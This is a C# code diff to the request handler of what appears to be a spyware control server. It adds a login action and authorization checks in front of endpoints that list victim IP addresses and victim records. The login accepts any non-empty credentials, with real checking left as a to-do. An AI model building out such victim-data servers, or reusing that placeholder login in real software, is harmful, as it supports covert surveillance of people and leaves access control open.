@@ -19,8 +19,12 @@ namespace Server.Handlers
             return message._sender == Sender.User;
         }
 
-        private async Task<string> GetVictimIpList()
+        private async Task<string> GetVictimIpList(ClientInfo clientInfo)
         {
+
+            if (!clientInfo.IsAuthorized)
+                return _director.GetUnauthorizedResponse().ToString();
+
             // Add connection to DB for get data
             List<string> ip_list = new List<string>()
             {
@@ -29,8 +33,11 @@ namespace Server.Handlers
             return _director.GetVictimsIpListResponse(ip_list).ToString();
         }
 
-        private async Task<string> GetVictimRecords(string victimIp)
+        private async Task<string> GetVictimRecords(string victimIp, ClientInfo clientInfo)
         {
+            if (!clientInfo.IsAuthorized)
+                return _director.GetUnauthorizedResponse().ToString();
+
             // Add connection to DB for get data
             List<VictimRecord> records = new List<VictimRecord>() { 
                 new VictimRecord{
@@ -44,7 +51,19 @@ namespace Server.Handlers
             return _director.GetVictimRecordsResponse(records).ToString();
         }
 
-        public async Task<string> HandleAsync(SpyMessage? message, EndPoint endPoint)
+        private async Task<string> LoginUser(string username, string password, ClientInfo clientInfo)
+        {
+            if (username == String.Empty || password == String.Empty)
+                return _director.GetUnauthorizedResponse().ToString();
+
+            // Add check on autorisation
+
+            clientInfo.SetAuthorization(username);
+            return _director.GetSuccessResponse().ToString();
+        }
+
+
+        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
         {
             if (message == null)
                 return _director.GetBadRequestResponse().ToString();
@@ -54,11 +73,16 @@ namespace Server.Handlers
             switch (message.Action)
             {
                 case MessageAction.GetVictimsIpList:
-                    response = await GetVictimIpList();
+                    response = await GetVictimIpList(clientInfo);
                     break;
                 case MessageAction.GetVictimRecords:
                     string victimIp = message.GetOption("victim_ip");
-                    response = await GetVictimRecords(victimIp);
+                    response = await GetVictimRecords(victimIp, clientInfo);
+                    break;
+                case MessageAction.Login:
+                    string username = message.GetOption("username");
+                    string password = message.GetOption("password");
+                    response = await LoginUser(username, password, clientInfo);
                     break;
                 default:
                     response = _director.GetNotFoundRequestResponse().ToString(); 
